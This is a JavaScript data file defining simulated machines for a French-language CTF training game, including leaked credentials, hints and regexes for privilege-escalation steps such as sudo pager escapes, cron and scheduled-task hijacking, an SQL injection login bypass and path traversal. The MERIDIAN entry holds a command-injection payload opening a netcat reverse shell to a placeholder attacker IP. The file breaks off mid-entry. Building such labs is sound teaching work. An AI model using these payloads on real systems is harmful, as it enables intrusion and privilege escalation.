// machines.js — Définition des machines du CTF Lab
// Chaque machine = 4 chapitres : recon -> access -> privesc -> flag
// fs : squelette de fichiers façon terminal.js (clé = chemin relatif au home, ou absolu si commence par /)

// IP fictive de la machine attaquante (kali), utilisée dans les commandes de reverse shell
// (nc -lvnp côté attaquant, payloads de callback dans les machines qui le supportent).
const ATTACKER_IP = "10.10.14.1";

const MACHINES = [
  // ─────────────────────────────────────────────────────────────────
  {
    id: "nimbus",
    name: "NIMBUS",
    ip: "10.10.11.21",
    difficulty: "Facile",
    os: "Linux (Debian 11)",
    briefing: "Un petit site vitrine d'entreprise. Une exposition oubliée pendant une migration traîne encore sur le réseau.",
    ports: [
      { port: 21, proto: "tcp", state: "open", service: "ftp", version: "vsftpd 3.0.3 (connexion anonyme autorisée)" },
      { port: 22, proto: "tcp", state: "open", service: "ssh", version: "OpenSSH 8.9p1 Debian" },
      { port: 80, proto: "tcp", state: "open", service: "http", version: "nginx 1.18.0 — \"Nimbus Corp\"" },
    ],
    web: {
      "/": "<html>\n<head><title>Nimbus Corp</title></head>\n<body>\n<h1>Bienvenue chez Nimbus Corp</h1>\n<p>Votre partenaire cloud de confiance.</p>\n<!-- TODO: retirer le compte FTP anonyme, les backups de migration traînent encore dedans -->\n</body>\n</html>",
    },
    ftp: {
      enabled: true,
      loginMsg: "220 (vsFTPd 3.0.3)\nConnexion anonyme acceptée.",
      files: {
        "readme.txt": "Sauvegardes temporaires de la migration serveur.\nA supprimer après validation (jamais fait...).",
        "backup_users.txt": "# export utilisateurs - NE PAS PARTAGER\njsmith:N1mbus_B4ckup!2024",
      },
    },
    sshUsers: {
      jsmith: { password: "N1mbus_B4ckup!2024" },
    },
    targetFS: {
      hostname: "nimbus",
      homeDir: "/home/jsmith",
      users: {
        jsmith: {
          home: "/home/jsmith",
          fs: {
            "user.txt": { type: "file", content: "FLAG{nimbus_acces_initial_ftp_leak}", perms: "-rw-r-----", owner: "jsmith" },
            ".bash_history": { type: "file", content: "ls\ncat user.txt\nsudo -l\nexit", perms: "-rw-------", owner: "jsmith" },
            "notes.txt": { type: "file", content: "Pense-bête : l'admin a laissé less accessible en sudo pour consulter les logs nginx sans mot de passe. Pratique pour le support...", perms: "-rw-r--r--", owner: "jsmith" },
            "note_interne.txt": { type: "file", content: "Note interne — Solenne Holdings\nR. Kade (audit interne) a demandé un accès à ce serveur de sauvegarde la semaine dernière.\nAccès refusé par l'IT, motif : \"hors périmètre de son équipe\". Voir avec RH si elle insiste.", perms: "-rw-r--r--", owner: "jsmith" },
          },
        },
      },
      sudoL: "L'utilisateur jsmith peut lancer les commandes suivantes sur nimbus :\n    (root) NOPASSWD: /usr/bin/less /var/log/nginx/access.log",
    },
    privesc: {
      type: "sudo-gtfobins",
      exploitCmdRegex: /^sudo\s+(\/usr\/bin\/)?less\s+\/var\/log\/nginx\/access\.log$/,
      pagerEscapeRegex: /^!\/?(bin\/)?sh$|^!bash$/,
      enterMsg:
        "10.10.10.1 - - [GET /] 200\n10.10.10.7 - - [GET /favicon.ico] 404\n(le pager less s'est ouvert avec les droits root)\n\nAstuce : less permet d'exécuter une commande shell depuis le pager avec !<commande>.\nTape : !sh",
    },
    rootFile: { path: "/root/root.txt", content: "FLAG{nimbus_root_less_gtfobins}" },
    hints: {
      recon: [
        "Un site web tourne peut-être sur ce serveur. Commence par scanner les ports ouverts.",
        "Utilise `nmap 10.10.11.21` pour lister les services exposés.",
        "Après le nmap, regarde le port 80 avec `curl http://10.10.11.21` : un commentaire HTML traîne dans le code source.",
      ],
      access: [
        "Un service de transfert de fichiers est ouvert et mal configuré : les connexions anonymes sont acceptées.",
        "Connecte-toi avec `ftp 10.10.11.21` (login anonyme), puis regarde ce qui traîne avec `ls` et `cat` dans le dossier récupéré (~/loot/nimbus-ftp/).",
        "Le fichier backup_users.txt contient un couple identifiant:mot de passe. Utilise-le pour te connecter en `ssh jsmith@10.10.11.21`.",
      ],
      privesc: [
        "Une fois connecté, regarde toujours ce que tu as le droit de faire en root sans mot de passe.",
        "Lance `sudo -l` : une commande NOPASSWD est autorisée. Cette commande (less) est un classique GTFOBins pour sortir d'un pager en shell root.",
        "Exécute exactement la commande listée par sudo -l (`sudo /usr/bin/less /var/log/nginx/access.log`), puis une fois dans le pager, tape `!sh` pour obtenir un shell root.",
      ],
    },
  },

  // ─────────────────────────────────────────────────────────────────
  {
    id: "vortex",
    name: "VORTEX",
    ip: "10.10.11.15",
    difficulty: "Facile",
    os: "Linux (Ubuntu 22.04)",
    briefing: "Une API interne de gestion d'utilisateurs. Le contrôle d'accès sur les identifiants a l'air... optimiste.",
    ports: [
      { port: 22, proto: "tcp", state: "open", service: "ssh", version: "OpenSSH 8.9p1 Ubuntu" },
      { port: 5000, proto: "tcp", state: "open", service: "http", version: "Vortex Users API (Werkzeug)" },
    ],
    web: {
      "/": "<html>\n<head><title>Vortex Users API</title></head>\n<body>\n<h1>Vortex Users API</h1>\n<p>Documentation : /api/docs</p>\n</body>\n</html>",
      "/api/docs": "Vortex Users API v1\n\nGET /api/users/<id>  — profil utilisateur par identifiant numerique\n\n(note interne : penser a ajouter un controle d'acces avant la prod)",
      "/api/users/1": '{"id":1,"username":"guest","role":"guest","note":"compte de demo public"}',
      "/api/users/2": '{"id":2,"username":"kwright","role":"admin","note":"rotation du mot de passe SSH en attente : V0rt3x_Adm1n!77"}',
    },
    ftp: { enabled: false },
    sshUsers: {
      kwright: { password: "V0rt3x_Adm1n!77" },
    },
    targetFS: {
      hostname: "vortex",
      homeDir: "/home/kwright",
      users: {
        kwright: {
          home: "/home/kwright",
          fs: {
            "user.txt": { type: "file", content: "FLAG{vortex_acces_initial_idor_api}", perms: "-rw-r-----", owner: "kwright" },
            ".bash_history": { type: "file", content: "id\nsudo -l\nexit", perms: "-rw-------", owner: "kwright" },
            "note_interne.txt": { type: "file", content: "Note interne — Solenne Holdings\nR. Kade signale des appels API suspects sur les comptes admin dans son rapport hebdomadaire.\nPersonne n'a encore donné suite. Elle a l'air très insistante ces derniers temps.", perms: "-rw-r--r--", owner: "kwright" },
          },
        },
      },
      extraFS: {},
      sudoL: "L'utilisateur kwright peut lancer les commandes suivantes sur vortex :\n    (root) NOPASSWD: /usr/bin/man",
    },
    privesc: {
      type: "sudo-gtfobins",
      exploitCmdRegex: /^sudo\s+(\/usr\/bin\/)?man\s+man$/,
      pagerEscapeRegex: /^!\/?(bin\/)?sh$|^!bash$/,
      enterMsg:
        "Reformatting page. Wait...\n(le pager de man s'est ouvert avec les droits root)\n\nAstuce : comme less, man s'appuie sur un pager qui permet d'exécuter une commande shell avec !<commande>.\nTape : !sh",
    },
    rootFile: { path: "/root/root.txt", content: "FLAG{vortex_root_man_gtfobins}" },
    hints: {
      recon: [
        "Une API web tourne sur un port non standard — regarde ce qu'elle expose.",
        "Après `nmap 10.10.11.15`, utilise `curl http://10.10.11.15/` puis `curl http://10.10.11.15/api/docs` pour comprendre le format des routes.",
        "La route accepte un identifiant numérique : essaie `curl http://10.10.11.15/api/users/1` puis `curl http://10.10.11.15/api/users/2` — rien ne vérifie que l'id demandé t'appartient (IDOR).",
      ],
      access: [
        "L'utilisateur d'id 2 n'est pas un compte de démo comme le premier...",
        "Son profil laisse échapper une info de rotation de mot de passe SSH.",
        "Connecte-toi avec `ssh kwright@10.10.11.15` et le mot de passe trouvé dans /api/users/2.",
      ],
      privesc: [
        "Toujours le réflexe `sudo -l` en arrivant sur une machine.",
        "`man` est autorisé en NOPASSWD — comme `less`, il ouvre un pager qui peut lancer un shell (GTFOBins).",
        "Lance exactement `sudo man man`, puis dans le pager tape `!sh` pour obtenir un shell root.",
      ],
    },
  },

  // ─────────────────────────────────────────────────────────────────
  {
    id: "cerberus",
    name: "CERBERUS",
    ip: "10.10.11.42",
    difficulty: "Moyen",
    os: "Linux (Ubuntu 22.04)",
    briefing: "Un outil interne de gestion de sauvegardes. Le SSH tourne sur un port non standard, et une tâche planifiée s'exécute en root.",
    ports: [
      { port: 80, proto: "tcp", state: "open", service: "http", version: "Cerberus Panel — outil interne (Werkzeug)" },
      { port: 2222, proto: "tcp", state: "open", service: "ssh", version: "OpenSSH 9.0p1 Ubuntu" },
    ],
    web: {
      "/": "<html>\n<head><title>Cerberus Panel</title></head>\n<body>\n<h1>Cerberus Panel — connexion interne</h1>\n<p>Accès réservé au service IT.</p>\n</body>\n</html>\n<!-- voir /robots.txt -->",
      "/robots.txt": "User-agent: *\nDisallow: /.env\nDisallow: /admin",
      "/.env": "APP_ENV=production\nDB_USER=admin\nDB_PASS=Cerb3r0s_2024!\n# note interne : mdurand réutilise ce mdp pour son compte SSH, à changer !",
    },
    ftp: { enabled: false },
    sshUsers: {
      mdurand: { password: "Cerb3r0s_2024!", port: 2222 },
    },
    targetFS: {
      hostname: "cerberus",
      homeDir: "/home/mdurand",
      users: {
        mdurand: {
          home: "/home/mdurand",
          fs: {
            "user.txt": { type: "file", content: "FLAG{cerberus_acces_initial_env_leak}", perms: "-rw-r-----", owner: "mdurand" },
            ".bash_history": { type: "file", content: "ls -la /opt/scripts\ncat /etc/cron.d/backup\nexit", perms: "-rw-------", owner: "mdurand" },
            "note_interne.txt": { type: "file", content: "Note interne — Solenne Holdings\nR. Kade a été vue en train de fouiller les scripts de déploiement du runner CI hier soir,\nen dehors de ses horaires habituels. À signaler ?", perms: "-rw-r--r--", owner: "mdurand" },
          },
        },
      },
      extraFS: {
        "/opt": { type: "dir" },
        "/opt/scripts": { type: "dir" },
        "/opt/scripts/backup.sh": {
          type: "file",
          perms: "-rwxrwxrwx",
          owner: "root",
          content: "#!/bin/bash\n# sauvegarde quotidienne\ntar -czf /var/backups/data.tar.gz /srv/data",
        },
        "/etc/cron.d": { type: "dir" },
        "/etc/cron.d/backup": {
          type: "file",
          perms: "-rw-r--r--",
          owner: "root",
          content: "* * * * * root /opt/scripts/backup.sh",
        },
      },
      sudoL: "Désolé, l'utilisateur mdurand n'est pas autorisé à exécuter sudo sur cerberus.\n(Ce n'est pas la voie à suivre ici — regarde plutôt du côté des tâches planifiées.)",
    },
    privesc: {
      type: "cron-writable",
      scriptPath: "/opt/scripts/backup.sh",
      plantContentRegex: /chmod\s+\+s\s+\/bin\/bash/,
      tickMsg: "[cron] backup.sh vient d'être exécuté par root (tâche planifiée toutes les minutes).\nLe bit SUID a été appliqué sur /bin/bash. Tu peux maintenant lancer `bash -p`.",
      escalateRegex: /^(\/bin\/)?bash\s+-p$/,
    },
    rootFile: { path: "/root/root.txt", content: "FLAG{cerberus_root_cronjob_suid_bash}" },
    hints: {
      recon: [
        "Le site interne cache peut-être un fichier de configuration qu'il ne devrait pas exposer.",
        "Après `nmap 10.10.11.42`, utilise `curl http://10.10.11.42` : un commentaire pointe vers un fichier à consulter.",
        "Le fichier robots.txt (`curl http://10.10.11.42/robots.txt`) interdit l'indexation de `/.env` — récupère-le avec `curl http://10.10.11.42/.env`.",
      ],
      access: [
        "Le fichier .env contient des identifiants de base de données... et une note sur la réutilisation de mot de passe.",
        "Le mot de passe DB_PASS est réutilisé pour un compte SSH : mdurand.",
        "Connecte-toi avec `ssh mdurand@10.10.11.42 -p 2222` et le mot de passe trouvé dans .env.",
      ],
      privesc: [
        "`sudo -l` ne donne rien ici. Regarde plutôt ce qui tourne automatiquement en root : les tâches planifiées (cron).",
        "Inspecte `/etc/cron.d/backup` puis les droits du script qu'il exécute avec `ls -la /opt/scripts/`. Le script est-il modifiable par tout le monde ?",
        "Le script est modifiable (rwxrwxrwx) et lancé par root chaque minute. Ajoute une charge utile avec `echo 'chmod +s /bin/bash' >> /opt/scripts/backup.sh`, attends l'exécution du cron (tape n'importe quelle commande), puis lance `bash -p`.",
      ],
    },
  },

  // ─────────────────────────────────────────────────────────────────
  {
    id: "obsidian",
    name: "OBSIDIAN",
    ip: "10.10.11.77",
    difficulty: "Difficile",
    os: "Linux (Debian 12)",
    briefing: "Une API de développement encore en préproduction, et un binaire SUID qui n'a rien à faire là.",
    ports: [
      { port: 22, proto: "tcp", state: "open", service: "ssh", version: "OpenSSH 9.2p1 Debian" },
      { port: 8000, proto: "tcp", state: "open", service: "http", version: "Obsidian API (dev preview, Werkzeug)" },
    ],
    web: {
      "/": '{"status":"ok","note":"backup dispo en /old/site-backup.txt (ne pas exposer publiquement, a retirer avant prod)"}',
      "/old/site-backup.txt":
        "# config.php (extrait sauvegarde)\nDB_HOST=localhost\nDB_NAME=obsidian_prod\nDEPLOY_USER=tvasquez\nDEPLOY_PASS=0bs1d1an_D3ploy#99",
    },
    ftp: { enabled: false },
    sshUsers: {
      tvasquez: { password: "0bs1d1an_D3ploy#99" },
    },
    targetFS: {
      hostname: "obsidian",
      homeDir: "/home/tvasquez",
      users: {
        tvasquez: {
          home: "/home/tvasquez",
          fs: {
            "user.txt": { type: "file", content: "FLAG{obsidian_acces_initial_config_leak}", perms: "-rw-r-----", owner: "tvasquez" },
            ".bash_history": { type: "file", content: "id\nfind / -perm -4000 -type f 2>/dev/null\nexit", perms: "-rw-------", owner: "tvasquez" },
            "note_interne.txt": { type: "file", content: "Note interne — Solenne Holdings\nBadge de R. Kade désactivé ce matin sur ordre de la direction.\nMotif officiel : \"réorganisation du service audit\". Personne ne comprend vraiment pourquoi.", perms: "-rw-r--r--", owner: "tvasquez" },
          },
        },
      },
      extraFS: {},
      sudoL: "Désolé, l'utilisateur tvasquez n'est pas autorisé à exécuter sudo sur obsidian.",
      suidBinaries: [
        "-rwsr-xr-x root root /usr/bin/passwd",
        "-rwsr-xr-x root root /usr/bin/su",
        "-rwsr-xr-x root root /usr/bin/mount",
        "-rwsr-xr-x root root /usr/bin/umount",
        "-rwsr-xr-x root root /usr/bin/find   <-- inhabituel !",
      ],
    },
    privesc: {
      type: "suid-binary",
      exploitCmdRegex: /^find\s+\S+\s+-exec\s+\/bin\/sh\s+-p\s*\\?;\s*-quit$/,
      enterMsg: "# (shell root obtenu via le SUID de /usr/bin/find — technique GTFOBins)",
    },
    rootFile: { path: "/root/root.txt", content: "FLAG{obsidian_root_suid_find_gtfobins}" },
    hints: {
      recon: [
        "Un service web tourne sur un port inhabituel, en mode développement.",
        "Après `nmap 10.10.11.77`, utilise `curl http://10.10.11.77:8000/` : la réponse JSON contient une note sur un fichier de sauvegarde.",
        "Récupère ce fichier avec `curl http://10.10.11.77:8000/old/site-backup.txt`.",
      ],
      access: [
        "La sauvegarde contient un extrait de configuration avec des identifiants de déploiement.",
        "DEPLOY_USER et DEPLOY_PASS ressemblent à des identifiants SSH.",
        "Connecte-toi avec `ssh tvasquez@10.10.11.77` et le mot de passe trouvé dans la sauvegarde.",
      ],
      privesc: [
        "`sudo -l` ne donne rien. Cherche plutôt des binaires avec le bit SUID activé.",
        "Lance `find / -perm -4000 -type f 2>/dev/null` : un binaire système ne devrait pas avoir ce bit.",
        "`/usr/bin/find` est SUID : GTFOBins propose `find . -exec /bin/sh -p \\; -quit` pour obtenir un shell root.",
      ],
    },
  },
  // ─────────────────────────────────────────────────────────────────
  {
    id: "phantom",
    name: "PHANTOM",
    ip: "10.10.11.58",
    difficulty: "Difficile",
    os: "Linux (Debian 12)",
    briefing: "Un petit CMS de blog interne, avec un espace admin dont le formulaire de connexion sent mauvais.",
    ports: [
      { port: 22, proto: "tcp", state: "open", service: "ssh", version: "OpenSSH 9.2p1 Debian" },
      { port: 80, proto: "tcp", state: "open", service: "http", version: "Apache/2.4.57 (Debian) — Phantom Blog CMS" },
    ],
    web: {
      "/": "<html>\n<head><title>Phantom Blog</title></head>\n<body>\n<h1>Phantom Blog</h1>\n<p>Le futur du contenu interne.</p>\n<a href=\"/admin/login.php\">Espace admin</a>\n<!-- Site multilingue via ?page=, ex: /index.php?page=fr.html -->\n<!-- TODO: supprimer config.php.bak du dossier, il traine encore -->\n</body>\n</html>",
      "/index.php?page=../../../../var/www/html/config.php.bak":
        "# config.php.bak (sauvegarde oubliee dans le dossier web)\n" +
        "// admin/login.php construit sa requete ainsi :\n" +
        "// SELECT * FROM users WHERE user='$_POST[user]' AND pass='$_POST[pass]'\n" +
        "// Aucun echappement -- a corriger avant la prod !\n" +
        "DB_HOST=localhost\nDB_NAME=phantom_cms\n" +
        "# Compte admin connu : broland (mot de passe non stocke ici)",
    },
    ftp: { enabled: false },
    sqli: {
      path: "/admin/login.php",
      injectionRegex: /'\s*or\s*'?1'?\s*=\s*'?1/i,
      successBody:
        "Connexion admin reussie (contournement par injection SQL).\nBienvenue broland.\n" +
        "Note interne : le compte SSH est synchronise avec ce compte -> broland:Ph4nt0m_SQL1_2024!",
      failBody: "Identifiants invalides.",
    },
    sshUsers: {
      broland: { password: "Ph4nt0m_SQL1_2024!" },
    },
    targetFS: {
      hostname: "phantom",
      homeDir: "/home/broland",
      users: {
        broland: {
          home: "/home/broland",
          fs: {
            "user.txt": { type: "file", content: "FLAG{phantom_acces_initial_sqli_bypass}", perms: "-rw-r-----", owner: "broland" },
            ".bash_history": { type: "file", content: "id\nsudo -l\nexit", perms: "-rw-------", owner: "broland" },
            "note_interne.txt": { type: "file", content: "Note interne — Solenne Holdings (extrait de chat interne)\n— Quelqu'un a des nouvelles de Rania ?\n— Non, silence radio depuis son badge coupé. Bizarre, elle bossait sur un truc important je crois.", perms: "-rw-r--r--", owner: "broland" },
          },
        },
      },
      extraFS: {},
      sudoL: "L'utilisateur broland peut lancer les commandes suivantes sur phantom :\n    (root) NOPASSWD: /usr/bin/awk",
    },
    privesc: {
      type: "sudo-direct",
      exploitCmdRegex: /^sudo\s+(\/usr\/bin\/)?awk\s+'BEGIN\s*\{\s*system\("\/bin\/sh"\)\s*\}'$/,
      enterMsg: "# (shell root obtenu via awk -- technique GTFOBins)",
    },
    rootFile: { path: "/root/root.txt", content: "FLAG{phantom_root_awk_gtfobins}" },
    hints: {
      recon: [
        "Le site web a l'air d'accepter un parametre pour choisir la langue affichee.",
        "Apres `nmap 10.10.11.58`, utilise `curl http://10.10.11.58/` : deux commentaires HTML trainent dans le code source.",
        "Le parametre `?page=` est vulnerable a une inclusion de fichier local (LFI). Essaie de remonter les dossiers pour lire `config.php.bak` : `curl \"http://10.10.11.58/index.php?page=../../../../var/www/html/config.php.bak\"`.",
      ],
      access: [
        "Le fichier recupere revele que le formulaire d'admin construit sa requete SQL sans echapper les entrees.",
        "Une injection SQL classique de contournement de login ressemble a : `' OR '1'='1' -- -`.",
        "Envoie-la en POST avec curl : `curl -d \"user=broland&pass=' OR '1'='1' -- -\" http://10.10.11.58/admin/login.php`. La reponse revele un mot de passe SSH, a utiliser avec `ssh broland@10.10.11.58`.",
      ],
      privesc: [
        "`sudo -l` ne donne rien a premiere vue... regarde bien la commande NOPASSWD autorisee.",
        "`awk` est un classique GTFOBins pour sortir un shell des qu'il tourne en sudo NOPASSWD.",
        "Lance exactement : `sudo awk 'BEGIN {system(\"/bin/sh\")}'` pour obtenir un shell root.",
      ],
    },
  },

  // ─────────────────────────────────────────────────────────────────
  {
    id: "meridian",
    name: "MERIDIAN",
    ip: "10.10.11.101",
    difficulty: "Difficile",
    os: "Linux (Debian 12)",
    briefing: "Une plateforme de monitoring interne. Le générateur de rapports accepte un chemin de fichier un peu trop librement.",
    ports: [
      { port: 22, proto: "tcp", state: "open", service: "ssh", version: "OpenSSH 9.2p1 Debian" },
      { port: 8080, proto: "tcp", state: "open", service: "http", version: "Meridian Monitor (Node.js / Express)" },
    ],
    web: {
      "/": "<html>\n<head><title>Meridian Monitor</title></head>\n<body>\n<h1>Meridian Monitor</h1>\n<p>Supervision interne des services.</p>\n<!-- Export de rapports : /report?file=... -->\n<!-- TODO: whitelist des chemins avant la mise en prod -->\n</body>\n</html>",
      "/report?file=../../../../etc/meridian/config.bak":
        "# config.bak (sauvegarde oubliee du service de monitoring)\n" +
        "SSH_USER=npatel\nSSH_PASS=M3r1d1an_Ops#41\n" +
        "# note : script interne autorise en sudo NOPASSWD pour les diagnostics -> /usr/bin/python3",
    },
    ftp: { enabled: false },
    sshUsers: {
      npatel: { password: "M3r1d1an_Ops#41" },
    },
    // Chemin alternatif (optionnel, non nécessaire pour finir la machine) : le endpoint
    // /report exécute en réalité le paramètre file dans un shell côté serveur, sans le
    // moindre échappement. En restant en écoute avec `nc -lvnp 4444` puis en déclenchant
    // exactement ce chemin, le "serveur" ouvre une connexion vers l'attaquant — même accès
    // que ssh, juste par une autre voie (injection de commande plutôt que fuite d'identifiants).
    altAccess: {
      triggerPath: `/report?file=report.txt;nc ${ATTACKER_IP} 4444 -e /bin/sh`,
      port: 4444,
      user: "npatel",
    },
    targetFS: {
      hostname: "meridian",
      homeDir: "/home/npatel",
      users: {
        npatel: {
          home: "/home/npatel",
          fs: {
            "user.txt": { type: "file", content: "FLAG{meridian_acces_initial_lfi_config_leak}", perms: "-rw-r-----", owner: "npatel" },
            ".bash_history": { type: "file", content: "id\nsudo -l\nexit", perms: "-rw-------", owner: "npatel" },
            "note_interne.txt": { type: "file", content: "Note interne — Solenne Holdings\nCommentaire trouvé dans une sauvegarde de config, signé R.K. :\n\"Les preuves ne sont pas ici. Elles sont là où personne ne regarde plus.\"", perms: "-rw-r--r--", owner: "npatel" },
          },
        },
      },
      extraFS: {},
      sudoL: "L'utilisateur npatel peut lancer les commandes suivantes sur meridian :\n    (root) NOPASSWD: /usr/bin/python3",
    },
    privesc: {
      type: "sudo-direct",
      exploitCmdRegex: /^sudo\s+(\/usr\/bin\/)?python3\s+-c\s+'import\s+os;\s*os\.system\("\/bin\/sh"\)'$/,
      enterMsg: "# (shell root obtenu via python3 -- technique GTFOBins)",
    },
    rootFile: { path: "/root/root.txt", content: "FLAG{meridian_root_python3_gtfobins}" },
    hints: {
      recon: [
        "Le monitoring propose un export de rapport basé sur un nom de fichier passé en paramètre.",
        "Après `nmap 10.10.11.101`, utilise `curl http://10.10.11.101:8080/` : un commentaire HTML pointe vers `/report?file=...`.",
        "Aucune restriction de chemin : remonte les dossiers pour lire une sauvegarde de config. Essaie `curl \"http://10.10.11.101:8080/report?file=../../../../etc/meridian/config.bak\"`.",
      ],
      access: [
        "La sauvegarde contient des identifiants SSH en clair.",
        "SSH_USER et SSH_PASS sont directement utilisables.",
        "Connecte-toi avec `ssh npatel@10.10.11.101` et le mot de passe trouvé dans config.bak.",
        "(Bonus, pas nécessaire) Le endpoint /report ne se contente pas de lire un fichier : il exécute carrément le paramètre `file` dans un shell côté serveur. Écoute en local avec `nc -lvnp 4444`, puis déclenche `curl \"http://10.10.11.101:8080/report?file=report.txt;nc 10.10.14.1 4444 -e /bin/sh\"` pour obtenir l'accès sans jamais toucher à ssh.",
      ],
      privesc: [
        "`sudo -l` liste une seule commande NOPASSWD, très polyvalente...",
        "`python3` est un classique GTFOBins pour obtenir un shell dès qu'il tourne en sudo NOPASSWD.",
        "Lance exactement : `sudo python3 -c 'import os; os.system(\"/bin/sh\")'` pour obtenir un shell root.",
      ],
    },
  },

  // ─────────────────────────────────────────────────────────────────
  {
    id: "glacier",
    name: "GLACIER",
    ip: "10.10.11.230",
    difficulty: "Expert",
    os: "Windows Server 2022",
    osType: "windows",
    briefing: "Un serveur de fichiers interne sous Windows. OpenSSH y est installe pour l'administration a distance, et une tache planifiee tourne en SYSTEM.",
    ports: [
      { port: 21, proto: "tcp", state: "open", service: "ftp", version: "Microsoft FTP Service (connexion anonyme autorisee)" },
      { port: 22, proto: "tcp", state: "open", service: "ssh", version: "OpenSSH for Windows 9.1" },
    ],
    web: {},
    ftp: {
      enabled: true,
      loginMsg: "220 Microsoft FTP Service\nConnexion anonyme acceptee.",
      files: {
        "readme.txt": "Partage temporaire du service IT.\nA nettoyer apres l'audit (jamais fait...).",
        "svc_notes.txt": "Compte de service local pour les sauvegardes :\nsvc_backup / B4ckup_Serv1ce#22\nOpenSSH est installe sur ce serveur pour l'administration a distance.",
      },
    },
    sshUsers: {
      svc_backup: { password: "B4ckup_Serv1ce#22" },
    },
    targetFS: {
      hostname: "glacier",
      homeDir: "/Users/svc_backup",
      users: {
        svc_backup: {
          home: "/Users/svc_backup",
          fs: {
            "user.txt": { type: "file", content: "FLAG{glacier_acces_initial_ftp_leak}", perms: "-rw-r-----", owner: "svc_backup" },
            "ConsoleHost_history.txt": { type: "file", content: "whoami\nschtasks /query\nexit", perms: "-rw-------", owner: "svc_backup" },
            "note_interne.txt": { type: "file", content: "Note interne — Solenne Holdings\nUn mot de passe de secours a été laissé dans ce dossier de scripts, daté du jour où\nR. Kade a perdu ses accès. Coïncidence ?", perms: "-rw-r--r--", owner: "svc_backup" },
          },
        },
      },
      extraFS: {
        "/Scripts": { type: "dir" },
        "/Scripts/backup.bat": {
          type: "file",
          perms: "-rwxrwxrwx",
          owner: "SYSTEM",
          content: "@echo off\n:: sauvegarde quotidienne des documents partages\nxcopy C:\\Data C:\\Backups /Y /E",
        },
      },
      schtasksOutput:
        "Nom de la tache:                     \\Backup\n" +
        "Prochaine execution:                 Dans moins d'1 minute\n" +
        "Statut:                              Pret\n" +
        "Compte d'execution:                  SYSTEM\n" +
        "Repetition:                          Toutes les minutes\n" +
        "Action:                              C:\\Scripts\\backup.bat\n\n" +
        "(Astuce : verifie les droits sur ce script avec icacls)",
      netUsers:
        "Comptes d'utilisateurs pour \\\\GLACIER\n" +
        "-------------------------------------------------------------------------\n" +
        "Administrateur           svc_backup               Invite\n" +
        "La commande s'est terminee correctement.",
    },
    privesc: {
      type: "schtask-writable",
      scriptPath: "/Scripts/backup.bat",
      plantContentRegex: /copy\s+C:\\Windows\\System32\\cmd\.exe\s+C:\\Windows\\Temp\\svc\.exe/i,
      tickMsg: "[Planificateur de taches] La tache 'Backup' vient de s'executer avec le compte SYSTEM (toutes les minutes).\ncmd.exe a ete copie avec les privileges SYSTEM vers C:\\Windows\\Temp\\svc.exe. Tu peux maintenant l'executer directement.",
      escalateRegex: /^C:\\Windows\\Temp\\svc\.exe$/i,
      enterMsg: "Microsoft Windows [version 10.0.20348.1]\n(c) Microsoft Corporation. Tous droits reserves.\n\n(shell obtenu avec le jeton SYSTEM copie dans svc.exe)",
    },
    rootFile: { path: "/Users/Administrator/Desktop/root.txt", content: "FLAG{glacier_root_scheduled_task_hijack}" },
    hints: {
      recon: [
        "Un service de transfert de fichiers est ouvert -- verifie s'il accepte les connexions anonymes.",
        "Utilise `nmap 10.10.11.230` puis `ftp 10.10.11.230` (connexion anonyme).",
        "Regarde les fichiers rapatries dans ~/loot/glacier-ftp/ avec `ls` et `cat` (ou `type`) : un compte de service et sa mission (sauvegardes) y sont notes.",
      ],
      access: [
        "Le fichier recupere contient des identifiants de service, et une precision sur le protocole d'administration disponible.",
        "OpenSSH est installe sur ce serveur Windows : les identifiants fonctionnent aussi en SSH.",
        "Connecte-toi avec `ssh svc_backup@10.10.11.230`.",
      ],
      privesc: [
        "Il n'y a pas de sudo sous Windows. Regarde plutot les taches planifiees avec `schtasks /query`.",
        "Une tache tourne en SYSTEM toutes les minutes et execute `C:\\Scripts\\backup.bat`. Verifie qui peut le modifier avec `icacls C:\\Scripts\\backup.bat`.",
        "Le script est modifiable par tout le monde. Piege-le : `echo copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\Temp\\svc.exe >> C:\\Scripts\\backup.bat`, attends l'execution de la tache (tape n'importe quelle commande), puis lance simplement `C:\\Windows\\Temp\\svc.exe`.",
      ],
    },
  },

  // ─────────────────────────────────────────────────────────────────
  {
    id: "axiom",
    name: "AXIOM",
    ip: "10.10.11.244",
    difficulty: "Insane",
    os: "Linux (Debian 12)",
    briefing: "Un runner CI/CD interne qui construit les images de conteneurs de l'entreprise. Le compte de service qui exécute les pipelines a un accès local qu'il ne devrait pas avoir.",
    ports: [
      { port: 22, proto: "tcp", state: "open", service: "ssh", version: "OpenSSH 9.2p1 Debian" },
      { port: 8080, proto: "tcp", state: "open", service: "http", version: "Axiom CI Dashboard (Node.js / Express)" },
    ],
    web: {
      "/": "<html>\n<head><title>Axiom CI</title></head>\n<body>\n<h1>Axiom CI</h1>\n<p>Pipelines de build internes.</p>\n<!-- Logs du dernier run : /logs/latest.txt -->\n<!-- TODO: purger les logs de build, un secret a fuite dans une execution recente -->\n</body>\n</html>",
      "/logs/latest.txt":
        "[axiom-ci] Clonage du depot...\n[axiom-ci] Etape 'deploy' : connexion au runner pour publier l'image\n" +
        "[axiom-ci] export CI_DEPLOY_USER=cibuild\n[axiom-ci] export CI_DEPLOY_PASS=Ax1om_CI_Runner#88\n" +
        "[axiom-ci] ssh $CI_DEPLOY_USER@10.10.11.244 'docker ps'\n[axiom-ci] Pipeline termine avec succes.",
    },
    ftp: { enabled: false },
    sshUsers: {
      cibuild: { password: "Ax1om_CI_Runner#88" },
    },
    dockerPs:
      "CONTAINER ID   IMAGE                    COMMAND            STATUS         PORTS     NAMES\n" +
      "7e2f9c1b4a3d   axiom/ci-runner:2.3      \"/entrypoint.sh\"   Up 3 hours               ci-runner-01\n" +
      "a91c3d7e5f02   axiom/registry-mirror    \"/start.sh\"        Up 3 hours     5000/tcp  registry-mirror",
    targetFS: {
      hostname: "axiom",
      homeDir: "/home/cibuild",
      users: {
        cibuild: {
          home: "/home/cibuild",
          fs: {
            "user.txt": { type: "file", content: "FLAG{axiom_acces_initial_ci_log_leak}", perms: "-rw-r-----", owner: "cibuild" },
            ".bash_history": { type: "file", content: "id\ngroups\ndocker ps\nsudo -l\nexit", perms: "-rw-------", owner: "cibuild" },
            "note_interne.txt": { type: "file", content: "Journal retrouvé — dernier fichier de la piste\nSi tu lis ceci, tu as suivi toute la piste à travers Solenne Holdings.\nJe m'appelle Rania Kade, ex-auditrice interne. Ce que j'ai trouvé n'était pas une simple\nnégligence de sécurité : c'était voulu. Tout est dans les logs de ce runner. Publie-les.", perms: "-rw-r--r--", owner: "cibuild" },
          },
        },
